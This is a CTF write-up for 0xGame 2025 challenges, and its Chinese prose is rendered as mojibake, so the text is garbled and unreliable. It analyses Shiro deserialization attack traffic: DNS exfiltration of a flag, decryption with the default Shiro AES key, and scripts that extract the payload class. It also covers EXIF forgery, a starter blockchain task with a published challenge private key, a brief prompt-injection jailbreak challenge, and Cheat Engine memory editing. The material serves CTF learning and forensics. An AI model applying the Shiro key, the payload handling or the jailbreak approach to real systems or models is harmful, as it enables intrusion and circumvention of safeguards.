è¿™ä¸ªå‘½ä»¤çš„æ„æ€æ˜¯è®¿é—®ä¸€ä¸ªå­åŸŸåï¼Œç„¶ååŸŸåçš„å‰ç¼€æ˜¯ç”¨ä¸€ç³»åˆ—å‘½ä»¤å¾—åˆ°çš„ï¼š

`cat flag->rev(ç¿»è½¬è¾“å‡º)->è¿›è¡Œrot13ç§»ä½->base64ç¼–ç ->åˆ é™¤æ¢è¡Œç¬¦`

è§£å¯†å°±å€’ç€æ¥å³å¯ï¼Œå…ˆè¯´è¯´å¯†æ–‡åœ¨å“ªé‡Œ

æˆ‘ä»¬è§‚å¯Ÿåˆ°å‘½ä»¤æ‰§è¡Œåï¼Œç›®æ ‡æœåŠ¡å™¨ä¸Š**æ²¡æœ‰äº§ç”Ÿå®Œæ•´çš„ HTTP æˆ– TCP è¿æ¥æµé‡**ï¼Œè¿™è¡¨æ˜æ•°æ®æ²¡æœ‰é€šè¿‡ä¼ ç»Ÿä¿¡é“ï¼ˆå¦‚ HTTP å›æ˜¾ï¼‰è¿”å›ã€‚

è¿™æ˜¯å› ä¸ºåœ¨æµé‡æŠ“åŒ…ä¸­ï¼Œæµé‡åè®®ä¼šå°†è®¿é—®æŸä¸ªå­åŸŸåçš„æµé‡å®šä¹‰ä¸º dns æµé‡ï¼Œå°±æ˜¯è¯´æœåŠ¡å™¨è®¿é—®åŸŸåçš„æ—¶å€™ï¼Œéœ€è¦å…ˆæœ¬åœ°è¿›è¡Œ dns è§£æï¼Œç„¶åæ‰èƒ½è¿›è¡Œåç»­çš„äº¤äº’ï¼Œhacker å°±æ˜¯åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œå°†å¯†æ–‡ç»™ç”¨ dns æµé‡ä¼ é€’å‡ºæ¥äº†

```plain
fTBlMXVGX2dmaFd7cnpuVGswCg==
```

è§£å¯†è„šæœ¬

æœ‰ä¸ªæ›´è½»æ¾çš„æ–¹æ³•

```bash
$ echo fTBlMXVGX2dmaFd7cnpuVGswCg== | base64 -d | tr 'A-Za-z' 'N-ZA-Mn-za-m' | rev
0xGame{Just_Sh1r0}
```

#### ä¸€äº›æ‹“å±•

> å…³äº shiro ååºåˆ—åŒ–æ¼æ´çš„åŸç†ä»¥åŠä¸€æ­¥ä¸€æ­¥è§£å¯†ï¼Œå¯¹å¤§å®¶æ¥è¯´è¾ƒéš¾ï¼Œæ‰€ä»¥ä¸åšè¦æ±‚ï¼Œå¯ä»¥çœ‹çœ‹

é¦–å…ˆè¦å¯¹ Apache shiro ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨æœ‰æ‰€äº†è§£ï¼ˆé€šå¸¸è¢«ç§°ä¸º **Shiro-550** å’Œ **Shiro-721** æ¼æ´ï¼‰

è¯¥æ¼æ´çš„æ ¸å¿ƒåœ¨äº Apache Shiro æ¡†æ¶çš„ **â€œRemember Meâ€**ï¼ˆè®°ä½æˆ‘ï¼‰åŠŸèƒ½ã€‚

å½“ç”¨æˆ·å‹¾é€‰â€œè®°ä½æˆ‘â€ç™»å½•æ—¶ï¼ŒShiro ä¼šæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š

1. å°†ç”¨æˆ·çš„èº«ä»½ä¿¡æ¯ï¼ˆä¸€ä¸ªå®ç°äº† `Serializable` æ¥å£çš„å¯¹è±¡ï¼Œå¦‚ `Principal`ï¼‰è¿›è¡Œ **Java åºåˆ—åŒ–**ã€‚

2. å¯¹åºåˆ—åŒ–åçš„æ•°æ®è¿›è¡Œ **AES åŠ å¯†**ã€‚

3. å¯¹å¯†æ–‡è¿›è¡Œ **Base64 ç¼–ç **ã€‚

4. å°†æœ€ç»ˆçš„ Base64 å­—ç¬¦ä¸²ä½œä¸º `rememberMe`**&#x20;Cookie** çš„å€¼å‘é€ç»™å®¢æˆ·ç«¯ã€‚

å½“å®¢æˆ·ç«¯å¸¦ç€è¿™ä¸ª `rememberMe` Cookie è®¿é—®æœåŠ¡å™¨æ—¶ï¼ŒæœåŠ¡å™¨ä¼šæ‰§è¡Œé€†å‘æ“ä½œï¼š**Base64 è§£ç  â†’ AES è§£å¯† â†’ Java ååºåˆ—åŒ–**ã€‚

æ”»å‡»è€…åˆ©ç”¨çš„å°±æ˜¯ä¸­é—´çš„ AES åŠ å¯†å¯†é’¥å’Œæœ€åçš„ Java ååºåˆ—åŒ–è¿‡ç¨‹ï¼Œæ¥ rce æ‰§è¡Œå‘½ä»¤

> å¦‚æœä¸Šé¢æœ‰ç–‘æƒ‘çš„è¯ï¼Œå¯¹æœ¬é¢˜å½±å“ä¸å¤§ï¼Œæ¨èè¿™ä¸ª[webshell å·¥å…·](https://github.com/SummerSec/ShiroAttack2)ï¼Œå¯ä»¥ç©ç©

æ€»ä¹‹ï¼Œè¿™é‡Œçš„è§£å¯†è¿‡ç¨‹å°±æ˜¯ Base64â†’ AES â†’ Java ååºåˆ—åŒ–

ç„¶åæˆ‘ä»¬éœ€è¦ä¸€äº›å…³é”®ä¿¡æ¯ï¼Œæ¯”å¦‚è¯´ AES çš„å¯†é’¥ï¼Œåœ¨æ—©æœŸ shiro æ¡†æ¶ï¼Œè¿™ä¸ªå¯†é’¥æ˜¯é»˜è®¤å›ºå®šçš„`kPH+bIxk5D2deZiIxcaaaA==`,åœ¨æ­£å¸¸è§£å¯† shiro æµé‡æ—¶ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å°è¯•çˆ†ç ´å¯†é’¥ï¼Œä½†åœ¨æœ¬é¢˜ä¸­ï¼Œç›´æ¥æ‹¿æ¥ç”¨å³å¯

ç„¶åè¿˜éœ€è¦ aes åŠ å¯†çš„ iv å‘é‡ï¼Œé»˜è®¤æ˜¯ base64 è§£ç åçš„å‰ 16 ä¸ªå­—èŠ‚

```python
import base64
from Crypto.Cipher import AES
import os

def decrypt_data(encrypted_b64, key_b64):
    try:

        encrypted_data = base64.b64decode(encrypted_b64)
        print(f"Base64è§£ç åæ•°æ®é•¿åº¦: {len(encrypted_data)} å­—èŠ‚")

        key = base64.b64decode(key_b64)
        print(f"AESå¯†é’¥é•¿åº¦: {len(key)} å­—èŠ‚")

        iv = encrypted_data[:16]
        print(f"IV (åå…­è¿›åˆ¶): {iv.hex()}")

        actual_encrypted_data = encrypted_data[16:]
        print(f"å®é™…åŠ å¯†æ•°æ®é•¿åº¦: {len(actual_encrypted_data)} å­—èŠ‚")

        cipher = AES.new(key, AES.MODE_CBC, iv)

        decrypted_data = cipher.decrypt(actual_encrypted_data)

        unpadded_data = unpad_pkcs7(decrypted_data)
        
        return unpadded_data
        
    except Exception as e:
        print(f"è§£å¯†è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯: {e}")
        return None

def unpad_pkcs7(data):

    padding_length = data[-1]
    return data[:-padding_length]

def save_to_file(data, filename):

    try:
        with open(filename, 'wb') as f:
            f.write(data)
        print(f"è§£å¯†ç»“æœå·²ä¿å­˜åˆ°: {filename}")
        return True
    except Exception as e:
        print(f"ä¿å­˜æ–‡ä»¶æ—¶å‡ºç°é”™è¯¯: {e}")
        return False

def main():
    encrypted_b64 = input("è¯·è¾“å…¥base64ç¼–ç çš„åŠ å¯†æ•°æ®: ").strip()
    key_b64 = input("è¯·è¾“å…¥base64æ ¼å¼çš„AESå¯†é’¥: ").strip()
    output_filename = input("è¯·è¾“å…¥è¾“å‡ºæ–‡ä»¶å(é»˜è®¤: decrypted_result.bin): ").strip()
    
    if not output_filename:
        output_filename = "decrypted_result.bin"
    print("å¼€å§‹è§£å¯†...")
    decrypted_data = decrypt_data(encrypted_b64, key_b64)
    
    if decrypted_data is not None:
        print(f"\nè§£å¯†æˆåŠŸ!")
        print(f"è§£å¯†æ•°æ®é•¿åº¦: {len(decrypted_data)} å­—èŠ‚")
        print(f"è§£å¯†æ•°æ®å‰16å­—èŠ‚(åå…­è¿›åˆ¶): {decrypted_data[:16].hex()}")

        try:
            text_output = decrypted_data.decode('utf-8')
            print(f"æ–‡æœ¬å†…å®¹é¢„è§ˆ: {text_output[:100]}...")
        except:
            print("è§£å¯†ç»“æœåŒ…å«äºŒè¿›åˆ¶æ•°æ®ï¼Œæ— æ³•æ˜¾ç¤ºä¸ºæ–‡æœ¬")

        if save_to_file(decrypted_data, output_filename):
            print(f"\næ–‡ä»¶å·²ä¿å­˜ä¸º: {output_filename}")
        else:
            print("æ–‡ä»¶ä¿å­˜å¤±è´¥")
    else:
        print("è§£å¯†å¤±è´¥")

if __name__ == "__main__":
    main()
```

è¿™æ˜¯è§£å¯†åå¾—åˆ°çš„æ–‡ä»¶

```bash
$ file decrypted_result.bin
decrypted_result.bin: Java serialization data, version 5
```

å¯ä»¥çœ‹å‡ºï¼Œè¿™æ˜¯ Java åºåˆ—åŒ–æ–‡ä»¶ï¼Œæ˜¯ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸å¥½åˆ†æï¼Œæˆ‘ä»¬åªèƒ½å…ˆé€šè¿‡ååºåˆ—åŒ–å¤„ç†ï¼Œä½†æ˜¯ä¹Ÿå°±æ˜¯è¿™ä¸€ç‚¹æœ€éš¾

> å¯æƒœæˆ‘è¿˜æ²¡å­¦ä¼šè¿™ç§æ–‡ä»¶çš„åˆ†æå¤„ç†~~ï¼ˆåœ¨å­¦äº†ï¼Œåœ¨å­¦äº†~~\
> ~~æ‰€ä»¥è¿˜æ˜¯å›åˆ°é‚£ä¸ªåœ¨çº¿è§£å¯†å·¥å…·å§~~

~~åœ¨çº¿ shiro è§£å¯†å·¥å…·~~~~<https://potato.gold/navbar/tool/shiro/ShiroTool.html>~~

å­¦ä¼šå’¯ï¼Œæ„Ÿè°¢ sprengï¼Œä»–æ•™ä¼šæˆ‘æ€ä¹ˆå¤„ç†ä¸€ä¸ª Java åºåˆ—åŒ–æ–‡ä»¶

![thanks](/img/0xgame2025/thanks.gif)

é¦–å…ˆï¼Œæˆ‘ä»¬å¯ä»¥åœ¨åºåˆ—åŒ–æ–‡ä»¶ä¸­æå– classï¼Œè¿™ä¸€æ­¥éš¾åº¦ä¸å¤§ï¼Œpython è„šæœ¬å¯ä»¥å®ç°

```python
import javaobj


def putsMessage(obj):
    print(f"ç±»: {obj.classdesc}")
    print(f"æ³¨è§£: {obj.annotations}")
    print(
        f"ç§æœ‰å±æ€§: {[i for i in dir(obj) if i.startswith('_') and not i.startswith('__')]}"
    )
    print(f"å…¬æœ‰å±æ€§: {[i for i in dir(obj) if not i.startswith('_')]}")


with open("decrypted_result.bin", "rb") as f:

    parser = javaobj.JavaObjectUnmarshaller(f)
    try:
        obj = parser.readObject()
        putsMessage(obj)
        putsMessage(obj.annotations[1])

        print(len(obj.annotations[1]._bytecodes[0]))
        with open("shiro_payload_output.class", "wb") as f2:
            for i in obj.annotations[1]._bytecodes[0]:
                f2.write(int.to_bytes((i + 256) % 256, 1))

    except EOFError:
        print("æ–‡ä»¶è§£æå®Œæˆ")
```

æ¥ç€ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ crf.jar è¿›è¡Œåç¼–è¯‘ï¼ˆç¥å™¨ï¼Œå¦‚æœæ‰¾ä¸åˆ°ï¼Œä¸‹è½½[æˆ‘çš„ crf](https://www.alipan.com/s/1n8e679GWu5)

```bash
java -jar cfr.jar shiro_payload_output.class > output.java
```

åç¼–è¯‘å‡ºæ¥çš„ç»“æœå¾ˆæ¸…æ™°

![image-20251008113818934](/img/0xgame2025/20251013231153_003.webp)![image-20251008113835006](/img/0xgame2025/20251013231153_004.webp)

ä¸€äº›å¿…è¦çš„ç»†èŠ‚éƒ½æœ‰

> ç”±äºè®¾å¤‡å·®å¼‚å§ï¼Œæˆ‘ä¸Šé¢ç”¨è„šæœ¬æå– class çš„æ—¶å€™ï¼Œä»£ç å·²ç»è¶³å¤Ÿæ¸…æ™°äº†ï¼Œç”šè‡³ä¸‹é¢çš„ crf æ“ä½œä¹Ÿä»…ä»…æ˜¯æ¢äº†ä¸ªå˜é‡åçš„æ ·å­ï¼Œå¯¹äº†ï¼Œæˆ‘ç”¨çš„ python åº“çš„åç§°æ˜¯ javaobj-py3

### ezEXIF

> ä¿¡æ¯ä¼ªé€ é¢˜ç›®ï¼Œæ¶‰åŠä¸€å®šçš„å›¾ç‰‡å®½é«˜ä¿®æ”¹

å…ˆè¯´è¯´å›¾ç‰‡å®½é«˜å§ï¼Œç”±äºè¿™äº›éƒ½æ˜¯â€œè§„å®šâ€ï¼ˆåˆ«é—®æˆ‘ä¸ºå•¥æ˜¯è¿™æ ·æ˜‚

#### å›¾ç‰‡å®½é«˜æ›´æ”¹

* png

* * é¦–å…ˆç”¨ 010 é”å®š ihdr å—ï¼Œç„¶åæ‰‹åŠ¨ç¼–è¾‘ï¼Œwidth å¯¹åº”çš„å®½åº¦ï¼Œheight å¯¹åº”çš„é«˜åº¦ï¼Œæ›´æ”¹æ•°å­—å³å¯

* jpg

* * ç”¨ 010 é”å®š sof0 æ•°æ®å—ï¼Œå›¾ç‰‡çš„å®½é«˜åœ¨è¿™é‡Œæ§åˆ¶ï¼ŒåŒæ ·ç›´æ¥æ›´æ”¹æ•°å­—ï¼Œç„¶åä¿å­˜å³å¯

* gif

* * ç”¨ 010 æŸ¥çœ‹ LogicalScreenDescriptorï¼Œä¸‹é¢çš„ Width å’Œ Height æ§åˆ¶çš„å°±æ˜¯å®½é«˜

> ä¸Šé¢çš„ä¸‰ç§å®½é«˜æ›´æ”¹ï¼ŒæŸç§æ„ä¹‰ä¸Šï¼Œå…¶å®å¹¶ä¸ä¸€æ ·ï¼Œæ¯”æ–¹è¯´ png æ”¹å˜å®½é«˜ï¼Œä»…ä»…æ˜¯å¯¹åº”çš„ç”»é¢æ¶ˆå¤±ï¼Œç„¶è€Œå…¶ä»–éƒ¨åˆ†æ²¡æœ‰æ”¹å˜ï¼Œjpg çš„è¯ï¼Œä¸€æ—¦æ›´æ”¹å®½é«˜ï¼Œå“ªæ€•å¾ˆç»†å¾®ï¼Œå¯¹å›¾ç‰‡çš„æŸä¼¤ä¹Ÿå¾ˆå¤§ï¼Œé‡Œé¢çš„åŸç”±ï¼Œå¸Œæœ›å¤§å®¶èƒ½åœ¨å­¦ä¹ å¯¹åº”çš„æ–‡ä»¶ç»“æ„æ—¶ï¼Œç•™æ„ä¸‹ç»†èŠ‚ï¼Œæ¯”å¦‚è¯´ png æ˜¯ä¸€ç§æµåŠ å¯†å­˜å‚¨â€¦â€¦

#### exif ä¿¡æ¯ç¯¡æ”¹

ä¸å¾—ä¸è¯´ï¼Œexiftool å·¥å…·æœ€å¥½ç”¨

```plain
exiftool -Make="Hacker" \
		 -Model="Kali linux" \
		 -DateTimeOriginal#="9999:99:99 66:66:66" \
		 -Description="motto:I can be better!"\
		 00.png
```

å†å°†å®½é«˜æ›´æ”¹åï¼Œæäº¤å°±èƒ½æ‹¿åˆ° flag

### ezChain

> æœ€ç®€å•çš„ä¸Šé“¾ï¼Œä¸»è¦æ˜¯æƒ³è®©æ–°ç”Ÿç†è§£åŒºå—é“¾é¢˜ç›®æ€ä¹ˆä¸Šæ‰‹ï¼Œéƒ¨ç½²åˆçº¦

æ­£å¸¸æ¥è¯´ï¼Œè§£å†³åŒºå—é“¾é¢˜ç›®ï¼Œæˆ‘ä»¬ä¼šè‡³å°‘æ‹¿åˆ°å››ä¸ªé‡è¦ä¿¡æ¯

ç¬¬ä¸€ä¸ªæ˜¯ rpc é“¾ï¼Œå¤§éƒ¨åˆ†é¢˜ç›®åº”è¯¥æ˜¯éƒ¨ç½²ç§é“¾ä¸Šè¿›è¡Œçš„ï¼Œéœ€è¦è¿›è¡Œç½‘ç»œé…ç½®

ç¬¬äºŒä¸ªæ˜¯åˆçº¦åœ°å€ï¼Œè¿™æ˜¯æˆ‘ä»¬å®ŒæˆæŒ‘æˆ˜å¿…é¡»æ‹¿åˆ°çš„é‡è¦ä¿¡æ¯

ç¬¬ä¸‰ä¸ªæ˜¯æ°´é¾™å¤´ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡å‡ºé¢˜äººæä¾›çš„æ°´é¾™å¤´è·å–éƒ¨åˆ†æµ‹è¯•å¸ï¼Œåˆçº¦éƒ¨ç½²è¿˜æœ‰äº¤æ˜“ç­‰ï¼Œéƒ½éœ€è¦ gas è´¹ç”¨ï¼Œä½†æ˜¯æœ¬é¢˜ä¸å¤ªä¸€æ ·ï¼Œä¼šæä¾›ä¸€ä¸ªç§é’¥ï¼Œé¢˜ç›®ä¼šè‡ªåŠ¨ç»™è¿™ä¸ªç§é’¥çš„è´¦æˆ·ä¸Šå…… 1eth,è¶³å¤Ÿåé¢çš„éƒ¨ç½²ç­‰è´¹ç”¨äº†

æœ€åå°±æ˜¯å…³é”®çš„æŒ‘æˆ˜åˆçº¦äº†ï¼Œsol è¯­æ³•éš¾æ˜“ä¸Šè¿˜å¥½ï¼Œå°±é‚£å‡ ä¸ªå¸¸ç”¨çš„ï¼Œå¤šè§å°±ä¼šè¯»ä¼šå†™äº†

#### how to solve

> ä¸‹é¢ä¸¾ä¾‹ç”¨è¿™ä¸ªç¯å¢ƒè¿›è¡Œ

```python
RPC_URL = "http://47.122.65.230:48334/65a7edf6-c415-4105-a26b-36f70f7913e6"
PRIVKEY = "fa7d264c487617dc552c2f0186111d321fc380762673e2ea6ce4973205ee9992"
SETUP_CONTRACT_ADDR = "0x074688F8E6f147502450B36f5eAa7CC3c3BAbA35"
WALLET_ADDR = "0x75248DebE8531030d4CDe342A5eBE8E7De5F4778"
```

* ä¸€äº›å‡†å¤‡

é¦–å…ˆéœ€è¦åœ¨æµè§ˆå™¨ä¸Šå®‰è£…**`metamask`**æ’ä»¶ï¼Œå‡ ä¹æ¯å®¶æµè§ˆå™¨éƒ½æœ‰è¿™ä¸ªçš„

![image-20251008003645578](/img/0xgame2025/20251013231153_005.webp)

æ¥ä¸‹æ¥å°±æ˜¯æ³¨å†Œï¼Œåˆ›å»ºæ–°é’±åŒ…ï¼Œè¿™äº›ä¸åšæˆªå›¾

* é…ç½® rpc

ç¬¬ä¸€æ¬¡ç™»å½•ï¼Œä¼šè‡ªåŠ¨è¿æ¥ä»¥å¤ªä¸»ç½‘ï¼Œæœ‰ä¸¤ä¸ªæ–¹å¼ï¼š

* * ä½¿ç”¨é­”æ³•

ç‚¹å‡»å·¦ä¸Šè§’çš„ Ethereum Mainnet,ä¼šè¿›å…¥é€‰æ‹©ç½‘ç»œçš„åŠŸèƒ½ï¼Œé€‰æ‹©æ·»åŠ è‡ªå®šä¹‰ç½‘ç»œ

* * ç­‰å¾…ä¸€ä¼šå„¿

å‡ºç°åˆ‡æ¢ç½‘ç»œ.jpg(æ²¡æˆªå›¾)

ç‚¹å‡»åï¼Œå¼¹çª—æ ·å­å’Œä¸Šé¢çš„é‚£ä¸ªå›¾ç‰‡æ˜¯ä¸€æ ·çš„

è¿™é‡Œéšä¾¿å¡«ï¼Œæ²¡å‡ºç°çº¢è‰²å°±æ²¡é”™

å…³äºè¿™é‡Œçš„é“¾ IDï¼Œä½ éšä¾¿è¾“å…¥ 1 ä¸ªæ•°å­—ï¼Œä¼šè‡ªåŠ¨å¼¹å‡ºæ­£ç¡®çš„é“¾ idï¼Œå°±é•¿è¿™æ ·ï¼Œæ”¹å›å»å³å¯

æœ€åä¿å­˜äº†ï¼Œæ‰ç®— rpc é…ç½®æˆåŠŸ

* ä½¿ç”¨ç§é’¥æ·»åŠ ç”¨æˆ·

å°† private key å¤åˆ¶è¿›å»ï¼Œå¯¼å…¥å³å¯ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œå·²ç»æœ‰åˆå§‹ä½™é¢ 1ctf äº†

* éƒ¨ç½²åˆçº¦

æ¥ä¸‹æ¥éœ€è¦ä½¿ç”¨åœ¨çº¿ ide - [remix](https://remix.ethereum.org/)

metamask åœ¨å“ªä¸ªæµè§ˆå™¨ï¼Œå°±åœ¨å“ªä¸ªæµè§ˆå™¨ä¸Šè®¿é—®

æ–°å»ºä¸ª sol æ–‡ä»¶ï¼Œå°†é¢˜ç›®ä¸‹å‘çš„ Setup.sol å¤åˆ¶è¿›å»ï¼Œæ–‡ä»¶åä¹Ÿè¦ä¸€æ ·çš„å–”ï¼Œè¿™é‡Œè®¾è®¡åˆçº¦é‡Œé¢çš„åˆçº¦åï¼Œæ€»ä¹‹å°±æ˜¯è¦ä¸€æ ·

ç„¶åè¿›è¡Œç¼–è¯‘ï¼Œéƒ¨ç½²

è¿™é‡Œè¿›è¡Œéƒ¨ç½²ï¼Œéœ€è¦å…ˆè®¾ç½®ç¯å¢ƒï¼Œé€‰ä¸­æµè§ˆå™¨æ’ä»¶-->Injected Provider-MetaMask ä¼šè‡ªåŠ¨å…³è”å½“å‰é’±åŒ…ç”¨æˆ·ä»¥åŠå¯¹åº”ç½‘ç»œï¼Œç„¶åå†å°†åˆçº¦åœ°å€å¤åˆ¶è¿‡æ¥ï¼Œç²˜è´´åˆ° At Address ä¸­ï¼Œç‚¹å‡»å³å¯ï¼ˆè¦å¤§è‡´ç†è§£ï¼Œæˆ‘ä»¬çš„æŒ‘æˆ˜åˆçº¦åº”è¯¥éƒ¨ç½²åˆ°é¢˜ç›®ä¸‹å‘çš„é‚£ä¸ªåœ°å€ï¼Œä¸ç„¶æˆ‘ä»¬è¦æ˜¯æˆåŠŸäº†ï¼Œé¢˜ç›®æ€ä¹ˆåˆ¤å®šå‘¢ï¼Ÿ

{% raw %}

```liquid
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract Setup {
    bool private solved;
    string private constant WINNING_PHRASE = "welcome_to_0xGame2025";

    constructor() payable {
    }

    function solve(string memory phrase) public {
        if (keccak256(abi.encodePacked(phrase)) == keccak256(abi.encodePacked(WINNING_PHRASE))) {
            solved = true;
        } else {
            revert("Setup: Incorrect phrase.");
        }
    }

    function isSolved() external view returns (bool) {
        return solved;
    }

    receive() external payable {}
}
```

{% endraw %}

* å®¡è®¡åˆçº¦å®ŒæˆæŒ‘æˆ˜

è¯»å®ŒæŒ‘æˆ˜åˆçº¦ï¼Œå°±è€ƒå¯Ÿäº†ä¸€ç‚¹ï¼Œå°±æ˜¯é€‰æ‰‹éœ€è¦æäº¤ä¸€ä¸ªå­—ç¬¦ä¸²`welcome_to_0xGame2025`ï¼Œåªæœ‰è¿™æ ·ï¼Œæ‰èƒ½è®© solved è¿”å› trueï¼Œæ‰ç®—å®Œæˆäº†æŒ‘æˆ˜ï¼ˆçœŸçš„æ˜¯ç®€å•ä¸Šé“¾å§ï¼Œç®—æ˜¯ 0xgame2025week2 çš„ä¸€ä¸ªç­¾åˆ°é¢˜

> è¿™æ˜¯åŒºå—é“¾ä¸Šæœ€æœ€åŸºç¡€çš„çŸ¥è¯†ï¼ˆæ²¡æœ‰æ¶‰åŠä»»ä½•åŒºå—é“¾å®‰å…¨ï¼ŒåŒºå—é“¾è¿˜æ˜¯å¾ˆæœ‰æ„æ€çš„ï¼Œåœ¨å›½å¤–èµ›äº‹æˆ–å›½å†…å¤§å‹èµ›äº‹ä¸­ä¼šç»å¸¸çœ‹åˆ° blockchainï¼Œè¿™ä¸ªèµ›é“ç›¸å¯¹æ¥è¯´ï¼Œç¡®å®å¾ˆæ–°å¾ˆéš¾ï¼Œå¦‚æœå¤§å®¶åé¢æ‰“ç®—ä¸“æ”» miscï¼Œå¯ä»¥å¯¹åŒºå—é“¾ç ”ç©¶ä¸€äºŒï¼Œç›¸ä¿¡ä¼šæœ‰äººä½“ä¼šåˆ°åŒºå—é“¾çš„é­…åŠ›çš„

## Week3

### ç¥ç§˜å›¾ä¹¦ç®¡ç†å‘˜

> ai æç¤ºè¯æ³¨å…¥ï¼Œæ–¹æ³•äº”èŠ±å…«é—¨çš„ï¼Œæˆ‘è¿™é‡Œç»™å‡ºæˆ‘æµ‹è¯•æˆåŠŸçš„ä¸€ä¸ªæ¡ˆä¾‹ï¼ˆä¸ä¿è¯èƒ½å¤ç°æˆåŠŸâ€¦â€¦

> è¿™æ˜¯ ai é¢˜ç›®ä¸­ç›¸å¯¹è€Œè¨€æœ€ç®€å•çš„ä¸€ä¸ªè€ƒæ³•ï¼Œé€šè¿‡åˆ›é€ æŸä¸ªæƒ…æ™¯ï¼Œè®© ai è¶Šç‹±ï¼Œè·³å‡ºå‡ºé¢˜äººè®¾ç½®çš„ promptï¼Œç„¶åå¤§å®¶åé¢æƒ³æ·±å…¥å­¦ä¹  ai çš„è¯ï¼Œå»ºè®®å¼€å§‹ä¸Šæ‰‹æœºå™¨å­¦ä¹ ç­‰ç­‰ï¼ŒçœŸæ­£çš„éš¾é¢˜åœ¨æˆ‘çœ‹æ¥åº”è¯¥æ˜¯æ ·æœ¬å¯¹æŠ—ï¼Œæ•°æ®æŠ•æ¯’ï¼Œç­‰ç­‰

### æ”¶é›†é˜³å…‰å§

> æœ¬é¢˜çš„æœŸæœ›è€ƒç‚¹æ˜¯ç”¨ cheat engine è¿™æ ·å¯ä»¥æ›´æ”¹å†…å­˜å€¼çš„å·¥å…·ï¼Œå°†è½¯ä»¶ä¸­çš„æŸä¸ªå€¼ä¿®æ”¹ä¸ºæŒ‡å®šå€¼ï¼Œç›´æ¥å®ŒæˆæŒ‘æˆ˜ï¼Œä½†æ˜¯å¤§æ¦‚ç‡ä¼šæœ‰ä¸å°‘äººé€‰æ‹©é€†å‘å¤„ç†ï¼ˆå¯ä»¥çš„ï¼Œç®— ta å‰å®³ï¼Œèµ–æˆ‘ï¼Œæ²¡å¥½å¥½å­¦é€†å‘ï¼Œè¦æ˜¯ä¼šæ··æ·†æˆ–åŠ å£³ï¼ŒåŒ…éš¾ä½ ta ä»¬

è¿è¡Œæ¸¸æˆä»¥åŠ`Cheat Engine`ï¼Œç‚¹å‡»å·¦ä¸Šè§’ file ä¸‹é¢çš„åƒç”µè„‘çš„å›¾æ ‡ï¼Œåœ¨å¼¹å‡ºçš„`process list`ä¸­é€‰ä¸­è¿è¡Œçš„æ¸¸æˆï¼ŒåŒå‡»å°±èƒ½å°†è¿›ç¨‹ attach è¿›å»

éšä¾¿ç‚¹å‡»å‡ ä¸ªé˜³å…‰ï¼Œè®© Sunshine çš„å€¼å˜åŒ–ä¸€ä¸‹ï¼ˆä¸»è¦æ˜¯è¶Šç‰¹æ®Šï¼Œæˆ‘ä»¬è¶Šå¥½æ‰¾ï¼Œä¸€ä¸ª exe è¿è¡Œçš„æ—¶å€™ï¼Œå†…éƒ¨æœ‰å¥½å¤šå¥½å¤šå€¼ï¼ŒæŒ‡ä¸å®šä¼šæŠ“å–åˆ°å…¶ä»–çš„å˜é‡

å°†ç›®å‰çš„å€¼ 5690 ç»™è¾“å…¥åˆ° value ä¸­ï¼Œç„¶åç‚¹å‡»`first scan`ï¼Œä¼šå‘ç°å·¦ä¾§å¼¹å‡ºäº†ä¸€ä¸ªåœ°å€ï¼Œè¿™å°±è¡¨ç¤º cheat engine å·²ç»æ‰¾åˆ°æ¸¸æˆè¿è¡Œçš„å†…å­˜ä¸­ï¼Œå­˜å‚¨é˜³å…‰æ•°é‡çš„å†…å­˜ï¼ŒåŒå‡»ä¼šè®©ç»“æœå‡ºç°åœ¨æœ€ä¸‹é¢ï¼Œå†æ¬¡åŒå‡»æ•°å­— 5690ï¼Œå¼¹å‡ºçª—å£ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç¼–è¾‘è¯¥å†…å­˜çš„æ•°å€¼äº†

ç‚¹å‡» ok åï¼Œä¼šå‘ç°æ¸¸æˆæ”¶é›†é˜³å…‰æ•°é‡å·²ç»è¾¾åˆ°äº† 666666ï¼Œå†éšæ„ç‚¹å‡»ä¸€ä¸ªé˜³å…‰å°±èƒ½å¼¹å‡º flag

è¿™é‡Œè¿˜æœ‰å…¶ä»–æ–¹æ³•æˆ–å·¥å…·ï¼Œæ¯”å¦‚è¯´æˆ‘ä»¬å¯ä»¥ç›´æ¥å°† 666666 æ”¹æˆ 1 å°±å¥½äº†

![image-20251014140619112](/img/0xgame2025/image-20251014140619112.png)

è¿˜æœ‰ä¸å°‘å…¶ä»–å·¥å…·å¯ä»¥ç›´æ¥æ”¹åŠ¨å†…å­˜ï¼Œæ¯”å¦‚è¯´ x64dbg,IDA åŠ¨è°ƒç­‰ç­‰

ç„¶åè¿™é‡Œæˆ‘è¡¥å……ä¸€ä¸ªæ­£ç»é€†å‘çš„åšæ³•

å…ˆæ˜¯è„± upx å£³ï¼Œç„¶åè¿›è¡Œ pyc åç¼–è¯‘,æ¥ä¸‹æ¥å°±æ˜¯å®¡è®¡ä»£ç æ¢å¤å‡ºæ¥ flag äº†ï¼Œéš¾åº¦ä¸å¤§ï¼Œç®—æ˜¯ week3 çš„ç­¾åˆ°é¢˜å¥½äº†

### base64Decoder

#### b64 ç»•è¿‡

æœ¬é¢˜æŒºè€ƒå¯ŸçŸ¥è¯†å‚¨å¤‡ä»¥åŠç»†èŠ‚è§‚å¯Ÿçš„ï¼Œç†Ÿæ‚‰ base64 åï¼Œä½¿ç”¨ python å’Œ shell è¿›è¡Œ base64 è§£ç ï¼Œä¼šå‘ç°ä¸¤ä¸ªè§£é‡Šå™¨ä¼šæœ‰ä¸€å®šçš„åŒºåˆ«

![image-20251014171458687](/img/0xgame2025/image-20251014171458687.png)

